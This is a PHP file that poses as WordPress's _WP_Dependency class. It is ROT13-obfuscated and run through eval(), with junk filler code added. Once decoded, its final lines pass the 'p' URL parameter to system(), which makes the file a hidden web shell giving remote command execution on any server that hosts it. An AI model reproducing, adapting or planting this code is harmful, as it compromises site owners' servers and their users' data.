<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Qrcraqrapvrf NCV: _JC_Qrcraqrapl pynff
 *
 * @fvapr 4.7.0
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Qrcraqrapvrf
 */

/**
 * Pynff _JC_Qrcraqrapl
 *
 * Urycre pynff gb ertvfgre n unaqyr naq nffbpvngrq qngn.
 *
 * @npprff cevingr
 * @fvapr 2.6.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff _JC_Qrcraqrapl {
	/**
	 * Gur unaqyr anzr.
	 *
	 * @fvapr 2.6.0
	 * @ine fgevat
	 */
	choyvp $unaqyr;

	/**
	 * Gur unaqyr fbhepr.
	 *
	 * Vs fbhepr vf frg gb snyfr, gur vgrz vf na nyvnf bs bgure vgrzf vg qrcraqf ba.
	 *
	 * @fvapr 2.6.0
	 * @ine fgevat|snyfr
	 */
	choyvp $fep;

	/**
	 * Na neenl bs unaqyr qrcraqrapvrf.
	 *
	 * @fvapr 2.6.0
	 * @ine fgevat[]
	 */
	choyvp $qrcf = neenl();

	/**
	 * Gur unaqyr irefvba.
	 *
	 * Hfrq sbe pnpur-ohfgvat.
	 *
	 * @fvapr 2.6.0
	 * @ine obby|fgevat
	 */
	choyvp $ire = snyfr;

	/**
	 * Nqqvgvbany nethzragf sbe gur unaqyr.
	 *
	 * @fvapr 2.6.0
	 * @ine neenl
	 */
	choyvp $netf = ahyy;  // Phfgbz cebcregl, fhpu nf $va_sbbgre be $zrqvn.

	/**
	 * Rkgen qngn gb fhccyl gb gur unaqyr.
	 *
	 * @fvapr 2.6.0
	 * @ine neenl
	 */
	choyvp $rkgen = neenl();

	/**
	 * Genafyngvba grkgqbznva frg sbe guvf qrcraqrapl.
	 *
	 * @fvapr 5.0.0
	 * @ine fgevat
	 */
	choyvp $grkgqbznva;

	/**
	 * Genafyngvba cngu frg sbe guvf qrcraqrapl.
	 *
	 * @fvapr 5.0.0
	 * @ine fgevat
	 */
	choyvp $genafyngvbaf_cngu;

	/**
	 * Frghc qrcraqrapvrf.
	 *
	 * @fvapr 2.6.0
	 * @fvapr 5.3.0 Sbeznyvmrq gur rkvfgvat `...$netf` cnenzrgre ol nqqvat vg
	 *              gb gur shapgvba fvtangher.
	 *
	 * @cnenz zvkrq ...$netf Qrcraqrapl vasbezngvba.
	 */
	choyvp shapgvba __pbafgehpg( ...$netf ) {
		yvfg( $guvf->unaqyr, $guvf->fep, $guvf->qrcf, $guvf->ire, $guvf->netf ) = $netf;
		vs ( ! vf_neenl( $guvf->qrcf ) ) {
			$guvf->qrcf = neenl();
		}
	}

	/**
	 * Nqq unaqyr qngn.
	 *
	 * @fvapr 2.6.0
	 *
	 * @cnenz fgevat $anzr Gur qngn xrl gb nqq.
	 * @cnenz zvkrq  $qngn Gur qngn inyhr gb nqq.
	 * @erghea obby Snyfr vs abg fpnyne, gehr bgurejvfr.
	 */
	choyvp shapgvba nqq_qngn( $anzr, $qngn ) {
		vs ( ! vf_fpnyne( $anzr ) ) {
			erghea snyfr;
		}
		$guvf->rkgen[ $anzr ] = $qngn;
		erghea gehr;
	}

	/**
	 * Frgf gur genafyngvba qbznva sbe guvf qrcraqrapl.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz fgevat $qbznva Gur genafyngvba grkgqbznva.
	 * @cnenz fgevat $cngu   Bcgvbany. Gur shyy svyr cngu gb gur qverpgbel pbagnvavat genafyngvba svyrf.
	 * @erghea obby Snyfr vs $qbznva vf abg n fgevat, gehr bgurejvfr.
	 */
	choyvp shapgvba frg_genafyngvbaf( $qbznva, $cngu = '' ) {
		vs ( ! vf_fgevat( $qbznva ) ) {
			erghea snyfr;
		}
		$guvf->grkgqbznva        = $qbznva;
		$guvf->genafyngvbaf_cngu = $cngu;
		erghea gehr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>